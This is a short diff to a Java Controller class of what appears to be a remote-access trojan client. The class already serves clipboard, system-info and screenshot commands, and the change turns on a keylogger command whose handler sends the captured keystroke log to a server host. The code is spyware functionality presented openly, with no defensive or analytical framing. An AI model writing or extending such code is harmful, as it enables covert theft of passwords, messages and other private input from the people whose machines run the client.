@@ -5,6 +5,8 @@ import models.SystemInfoModel;
 import org.json.JSONArray;
 import utils.Helper;
 import utils.JSON;
+import utils.KeyLogger;
+import utils.console;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
@@ -30,14 +32,14 @@ public class Controller {
         put(COMMAND_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
-//        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
+        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
     }
 
-//    private static String getKeylogger(JSON input) {
-//        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_KEYLOGGER)
-//                .put("keylogger", new JSONArray(KeyLogger.getKeylog()))
-//                .json();
-//    }
+    private static String getKeylogger(JSON input) {
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_KEYLOGGER)
+                .put("keylogger", KeyLogger.getLog())
+                .json();
+    }
 
     private static String getScreen(JSON input) {
         try {
